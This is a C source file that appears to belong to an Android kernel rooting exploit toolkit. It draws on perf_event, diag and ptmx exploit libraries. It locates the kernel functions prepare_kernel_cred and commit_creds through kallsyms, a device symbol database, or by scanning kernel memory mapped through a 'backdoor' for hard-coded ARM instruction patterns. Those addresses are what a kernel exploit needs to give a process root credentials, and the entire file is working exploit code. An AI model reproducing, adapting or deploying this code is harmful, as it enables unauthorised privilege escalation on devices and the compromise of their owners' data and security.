#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "device_database/device_database.h"
#include "cred.h"
#include "mm.h"
#include "libperf_event_exploit/perf_swevent.h"
#include "ptmx.h"
#include "libdiagexploit/diag.h"
#include "kallsyms.h"
#include "backdoor_mmap.h"

static bool
get_creds_functions_addresses(void **prepare_kernel_cred_address, void **commit_creds_address)
{
  *prepare_kernel_cred_address = (void *)device_get_symbol_address(DEVICE_SYMBOL(prepare_kernel_cred));
  *commit_creds_address = (void*)device_get_symbol_address(DEVICE_SYMBOL(commit_creds));

  if (*prepare_kernel_cred_address && *commit_creds_address) {
    return true;
  }

  return false;
}

static uint32_t prepare_kernel_cred_asm[] = { 0xe59f30bc, 0xe3a010d0, 0xe92d4070, 0xe1a04000 };
static size_t prepare_kernel_cred_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_prepare_kernel_cred(void *mem, size_t length)
{
  void *prepare_kernel_cred;

  prepare_kernel_cred = memmem(mem, length, &prepare_kernel_cred_asm, prepare_kernel_cred_asm_length);
  if (!prepare_kernel_cred) {
    printf("Couldn't find prepare_kernel_cred address\n");
    return NULL;
  }

  return prepare_kernel_cred;
}

static uint32_t commit_creds_asm[] = { 0xe92d4070, 0xe1a0200d, 0xe3c23d7f, 0xe1a05000 };
static size_t commit_creds_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_commit_creds(void *mem, size_t length)
{
  void *commit_creds;

  commit_creds = memmem(mem, length, &commit_creds_asm, commit_creds_asm_length);
  if (!commit_creds) {
    printf("Couldn't find commit_creds address\n");
    return NULL;
  }

  return commit_creds;
}

static bool
find_creds_functions_with_backdoor(void)
{
  void *address;

  if (!backdoor_open_mmap()) {
    return false;
  }

  prepare_kernel_cred = find_prepare_kernel_cred((void *)BACKDOOR_MMAP_ADDRESS, BACKDOOR_MMAP_SIZE);
  if (prepare_kernel_cred) {
    commit_creds = find_commit_creds(prepare_kernel_cred + 4, BACKDOOR_MMAP_SIZE);

    prepare_kernel_cred = backdoor_convert_to_kernel_address(prepare_kernel_cred);
    commit_creds = backdoor_convert_to_kernel_address(commit_creds);
  }

  backdoor_close_mmap();

  return prepare_kernel_cred && commit_creds;
}

bool
setup_creds_functions(void)
{
  if (kallsyms_exist()) {
    prepare_kernel_cred = kallsyms_get_symbol_address("prepare_kernel_cred");
    commit_creds = kallsyms_get_symbol_address("commit_creds");
    return true;
  }

  if (get_creds_functions_addresses((void**)&prepare_kernel_cred, (void**)&commit_creds)) {
    return true;
  }

  if (find_creds_functions_with_backdoor()) {
    return true;
  }

  print_reason_device_not_supported();
  return false;
}

